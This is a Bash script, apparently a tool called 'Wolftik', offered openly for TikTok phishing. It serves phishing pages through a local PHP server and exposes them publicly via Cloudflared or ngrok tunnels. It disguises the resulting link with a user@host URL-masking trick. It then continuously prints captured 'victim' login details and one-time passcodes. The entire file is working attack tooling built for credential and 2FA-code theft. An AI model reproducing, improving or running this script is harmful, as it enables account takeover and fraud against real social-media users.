#!/bin/bash

# ASCII Art
echo -e "${CYAN}"
echo -e "===================================="
echo -e " 
          Welcome 
             to
            the 
            cave
             of
           WOLF. 
THE CREATER OF WOLFTIK TOOL IS( CYBER WOLF) "
echo -e "===================================="
echo -e "${NC}"

# Rest of your script...
# Colors for output
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m' # No Color

# Mask URL function using is.gd
mask_url() {
    echo -e "${YELLOW}[*] Masking URL...${NC}"
    read -p "Enter URL to mask (e.g., https://www.youtube.com): " mask_domain
    read -p "Enter social engineering words (e.g., free-likes): " social_words
    final_masked_url="$mask_domain-$social_words@$1"
    echo -e "${GREEN}[*] Masked URL: ${final_masked_url}${NC}"
}

# Function to display victim info
display_victim_info() {
    if [[ -f "victim_info.txt" ]]; then
        echo -e "\n${GREEN}[*] Victim Information:${NC}"
        cat victim_info.txt
    fi
}

# Function to display OTP
display_victim_otp() {
    if [[ -f "victim_otp.txt" ]]; then
        echo -e "\n${GREEN}[*] Victim OTP:${NC}"
        cat victim_otp.txt
    fi
}

# Main Menu
echo -e "${CYAN}"
echo -e "===================================="
echo -e "           ⠀⢸⡏⠉⠉⠉⢻⢦⠀⠀⠀⠀⠀⠀⠀⠀
⠀H  A C K⠀⠀⠀⢸⡇⠀⠀⠀⠈⣷⣇ T I K T O K⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⠻⣄⠀     
           ⠀⢸⡇⠀⠀⠀⠀⠀⠀⠈⠉⠓⠒⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡷⣽⡆
⠀⠀⠀⢀⣠⠴⠒⠚⠛⠛⣦⡀⢸⡇⠀⠀⠀⢸⡻⣶⣤⣄⣀⣀⣟⢾⡇
⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⡟⢿⢸⡇⠀⠀⠀⢸⣝⡏⠙⠳⠬⢷⣌⣿⠇
⢠⠏⠀⠀⠀⠀⢀⡤⢤⡴⣟⢾⢸⡇⠀⠀⠀⢸⣌⡇⠀⠀⠀⠀⠀⠀⠀
⡞⠀⠀⠀⠀⡴⢯⣙⣦⠽⠾⠿⢸⡇⠀⠀⠀⢸⣌⡇⠀⠀⠀⠀⠀⠀⠀
⡇⠀⠀⠀⢸⡓⢤⠟⠀⠀⠀⠀⢸⡇⠀⠀⠀⢸⣌⡇⠀⠀⠀⠀⠀⠀⠀
⣇⠀⠀⠀⠈⢿⣾⠀⠀⠀⠀⢀⡾⠀⠀⠀⠀⡾⢮⡇⠀⠀⠀⠀⠀⠀⠀
⠹⡄⠀⠀⠀⠀⠙⠳⠤⠤⠖⠋⠀⠀⠀⠀⣰⡛⢦⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠙⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⢧⣙⡞⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⢶⣤⣄⣀⣀⣀⣀⣠⣤⠾⣏⠙⣦⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠳⠽⣮⣻⣌⣳⣬⠷⠞⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
             WITH
 _    _       _  __ _   _ _
| |  | |     | |/ _| | (_) |
| |  | | ___ | | |_| |_ _| | __
| |/\| |/ _ \| |  _| __| | |/ /
\  /\  / (_) | | | | |_| |   <
 \/  \/ \___/|_|_|  \__|_|_|\_\

   "
echo -e "===================================="
echo -e "${NC}"

echo -e "${YELLOW}[::]Dear wolf Select (1)to Attack on  Your Victim [::]${NC}"
echo -e "${BLUE}[1] TikTok Phishing${NC}"
echo -e "${RED}[99] Exit${NC}"
# Get user choice
read -p "[-] Select an option: " option

# If user selects TikTok phishing
if [ "$option" == "1" ]; then
    echo -e "${GREEN}[::] TikTok Phishing Selected [::]${NC}"
    echo -e "${CYAN}[1] Cloudflared${NC}"
    echo -e "${CYAN}[2] Ngrok${NC}"
    echo -e "${CYAN}[3] Localhost${NC}"

    # Get the forwarding option
    read -p "[-] Select a port forwarding service: " port_option

    if [ "$port_option" == "1" ]; then
        echo -e "${GREEN}[-] Cloudflared Selected${NC}"
        # Start PHP server and link to your custom phishing pages
        php -S 127.0.0.1:8083 -t ~/Wolftik > /dev/null 2>&1 &
        PHP_PID=$!

        # Start Cloudflared tunnel and save output to log
        cloudflared tunnel --url http://127.0.0.1:8083 > cloudflared.log 2>&1 &
        CLOUDFLARED_PID=$!

        # Wait for Cloudflared to initialize
        sleep 10

        # Extract Cloudflared link from log
        CLOUD_FLARE_LINK=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare.com' cloudflared.log | tail -n 1)
        if [ -z "$CLOUD_FLARE_LINK" ]; then
            echo -e "${RED}[-] Failed to retrieve Cloudflared link.${NC}"
            cat cloudflared.log # Output the log for debugging
        else
            echo -e "${YELLOW}[*] Link Generated:${NC}"
            echo -e "${GREEN}[-] $CLOUD_FLARE_LINK${NC}"

            # Ask user if they want to mask the URL
            read -p "[-] Do you want to mask the URL? [y/n]: " mask_choice
            if [ "$mask_choice" == "y" ]; then
                mask_url $CLOUD_FLARE_LINK
            fi
        fi

        # Ensure Cloudflared and PHP processes continue running
        echo -e "${YELLOW}[*] Cloudflared and PHP server are running in the background.${NC}"

    elif [ "$port_option" == "2" ]; then
        echo -e "${GREEN}[-] Ngrok Selected${NC}"
        # Ensure ngrok is installed
        if [ ! -f "ngrok" ]; then
            echo -e "${YELLOW}[*] Downloading ngrok...${NC}"
            wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
            unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
            chmod +x ngrok
        fi
        # Start PHP server and link to your custom phishing pages
        php -S 127.0.0.1:8083 -t ~/Wolftik > /dev/null 2>&1 &
        PHP_PID=$!
        # Start Ngrok tunnel
        ./ngrok http 8083 > ngrok.log 2>&1 &
        NGROK_PID=$!
        sleep 5
        # Extract Ngrok link
        NGROK_LINK=$(grep -o 'https://[0-9a-z]*\.ngrok.io' ngrok.log | tail -n 1)
        if [ -z "$NGROK_LINK" ]; then
            echo -e "${RED}[-] Failed to retrieve Ngrok link.${NC}"
            cat ngrok.log # Output the log for debugging
        else
            echo -e "${YELLOW}[*] Link Generated:${NC}"
            echo -e "${GREEN}[-] $NGROK_LINK${NC}"

            # Ask user if they want to mask the URL
            read -p "[-] Do you want to mask the URL? [y/n]: " mask_choice
            if [ "$mask_choice" == "y" ]; then
                mask_url $NGROK_LINK
            fi
        fi

        # Ensure Ngrok and PHP processes continue running
        echo -e "${YELLOW}[*] Ngrok and PHP server are running in the background.${NC}"

    elif [ "$port_option" == "3" ]; then
        echo -e "${GREEN}[-] Localhost Selected${NC}"
        # Start PHP server and link to your custom phishing pages
        php -S 127.0.0.1:8083 -t ~/Wolftik > /dev/null 2>&1 &
        PHP_PID=$!
        sleep 2
        echo -e "${YELLOW}[*] Access the page locally at:${NC}"
        echo -e "${GREEN}[-] http://127.0.0.1:8083${NC}"

        # Ensure PHP process continues running
        echo -e "${YELLOW}[*] PHP server is running in the background.${NC}"

    else
        echo -e "${RED}[-] Invalid option, exiting.${NC}"
    fi

    # Start monitoring victim data submissions
    while true; do
        if [[ -f "victim_info.txt" ]]; then
            display_victim_info
            rm victim_info.txt
        fi
        if [[ -f "victim_otp.txt" ]]; then
            display_victim_otp
            rm victim_otp.txt
        fi
        sleep 5
    done

elif [ "$option" == "99" ]; then
    echo -e "${RED}Exiting...${NC}"
    exit 1

else
    echo -e "${RED}Invalid Option!${NC}"
fi
